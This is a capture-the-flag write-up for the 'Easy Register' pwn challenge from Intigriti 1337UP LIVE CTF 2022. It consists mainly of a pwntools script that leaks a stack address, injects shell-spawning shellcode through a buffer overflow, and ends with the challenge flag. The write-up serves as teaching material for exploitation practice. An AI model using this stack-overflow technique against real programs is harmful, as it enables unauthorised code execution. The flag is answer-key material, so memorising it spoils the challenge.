---
name: Easy Register (2022)
event: Intigriti 1337UP LIVE CTF 2022
category: Pwn
description: Writeup for Easy Register (Pwn) - Intigriti 1337UP LIVE CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Easy Register

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/790lGRdyXaE/0.jpg)](https://youtu.be/790lGRdyXaE "Intigriti 1337UP LIVE CTF 2022: Easy Register")

## Challenge Description

> Registers are easy!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b'>', payload)  # Cyclic pattern
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './easy_register'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Get the stack address (where our shellcode will go)
io.recvlines(6)
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked stack_addr: %#x", stack_addr)

# Need to pop registers at the beginning to make room on stack
shellcode = asm(shellcraft.popad())
# Build shellcode (cat flag.txt or spawn shell)
shellcode += asm(shellcraft.sh())
# Pad shellcode with NOPs until we get to return address
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
    padding,
    shellcode,
    stack_addr
])

io.sendlineafter(b'>', payload)  # Inject payload

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}`
